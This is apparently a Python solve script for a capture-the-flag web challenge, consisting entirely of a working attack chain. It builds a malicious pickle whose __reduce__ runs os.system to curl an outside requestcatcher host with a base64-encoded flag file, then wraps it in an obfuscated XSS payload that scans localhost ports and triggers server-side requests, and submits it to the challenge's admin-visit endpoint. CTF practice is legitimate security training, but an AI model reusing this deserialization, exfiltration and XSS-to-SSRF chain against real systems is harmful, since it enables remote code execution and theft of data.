import pickle, os
import requests

REQUESTBIN = 'https://zzre.requestcatcher.com' # requestbin url

class P(object):
    def __reduce__(self):
        return (os.system, (f'curl {REQUESTBIN}/zzz?$(cat /ctf/flag.txt | base64)',))

def gen_payload():
    pickledPayload = pickle.dumps(P())
    hexEncodedPayload = pickledPayload.hex()
    print(f'[*] Payload: {hexEncodedPayload}')
    return hexEncodedPayload

hexEncodedPayload = gen_payload()

URL = 'http://triple-whammy-admin.chal.cyberjousting.com'
# URL = 'http://localhost:40004'

xss_script = '''
<script>
    for(let port=5700;port<=6000;port++) {{
    let payload = {{
        url: `http://127.0.0.1:${{port}}/pickle?pickle={payload}`
    }};

    fetch('http://127.0.0.1:1337/query', {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json',
        }},
        body: JSON.stringify(payload),
        mode: 'cors'
    }});
}}
</script>
'''.format(payload=hexEncodedPayload).replace('\n', '')

for c in '`$+;{}()?/<>=:., ':
    xss_script = xss_script.replace(c, '%'+hex(ord(c))[2:])

data = {'path': f'/?name={xss_script}'}
res = requests.post(URL + '/visit', data=data)

print(res.text)